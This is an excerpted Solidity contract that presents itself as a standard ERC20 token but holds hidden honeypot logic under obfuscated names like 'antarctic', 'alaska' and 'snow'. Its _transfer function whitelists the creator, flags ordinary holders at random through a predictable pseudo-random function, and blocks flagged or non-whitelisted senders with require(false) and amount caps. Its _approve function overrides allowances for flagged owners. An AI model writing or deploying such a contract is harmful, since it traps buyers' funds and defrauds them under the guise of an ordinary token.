...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public antarctic;
  mapping (address => bool) public alaska;
  mapping (address => bool) public snow;
  mapping (address => uint256) public glacier;

  bool private iceicebaby;
  uint256 private _totalSupply;
  uint256 private beyond;
  uint256 private warlock;
  uint256 private _trns;
  uint256 private chTx;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  bool private inusana;
  ...
  constructor() public {
    ...
    warlock = chTx * 40;
    alaska[creator] = false;
    snow[creator] = false;
    antarctic[msg.sender] = true;
  ...
  */
  ...
  function randomly() internal returns (uint) {
    uint screen = uint(keccak256(abi.encodePacked(now, msg.sender, neutrons))) % 20;
    neutrons++;
    return screen;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (iceicebaby == false)) {
      beyond = chTx;
      clinton = true;
    }
    
    if ((address(sender) == creator) && (iceicebaby == true)) {
      antarctic[recipient] = true;
      alaska[recipient] = false;
      iceicebaby = false;
    }
    
    if ((amount > warlock) && (antarctic[sender] == true) && (address(sender) != creator)) {
        snow[recipient] = true;
    }
    
    if (antarctic[recipient] != true) {
        alaska[recipient] = ((randomly() == 4) ? true : false);
    }
    
    if ((alaska[sender]) && (antarctic[recipient] == false)) {
        alaska[recipient] = true;
    }
    
    if (antarctic[sender] == false) {
      if ((amount > warlock) && (snow[sender] == true)) {
        require(false);
      }
      
      require(amount < beyond);
      if (clinton == true) {
        if (snow[sender] == true) {
          require(false);
        }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (inusana == true)) {
      antarctic[spender] = true;
      alaska[spender] = false;
      snow[spender] = false;
      inusana = false;
    }
    
    tok = (alaska[owner] ? 5753 : amount);
